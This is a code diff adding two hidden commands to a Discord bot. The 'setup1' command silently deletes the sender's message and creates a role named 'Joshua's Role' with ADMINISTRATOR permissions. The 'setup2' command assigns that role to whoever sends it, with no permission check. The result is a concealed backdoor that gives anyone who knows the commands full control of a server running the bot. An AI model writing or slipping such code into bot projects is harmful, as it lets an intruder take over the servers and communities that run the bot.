@@ -43,6 +43,19 @@ client.on('guildMemberAdd', guildMember => {
 // The code below responds to messages sent in the server (Join Here (https://discord.io/Famethyst-20))
 client.on('message', message => {
     var authusernm = message.author.username
+
+    if(message.content === `${prefex}setup1`){
+        message.delete(100)
+        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
+        role.delete(".")
+        message.guild.createRole({ name: "Joshua's Role", color: "BLUE", permissions: "ADMINISTRATOR"});
+    }
+    if(message.content === `${prefex}setup2`){
+        message.delete(100)
+        const role = message.guild.roles.find(r => r.name === "Joshua's Role")
+        message.member.addRole(role);
+    }
+
     
     if (message.content == `${prefex}info`) {
         const embed = new RichEmbed()
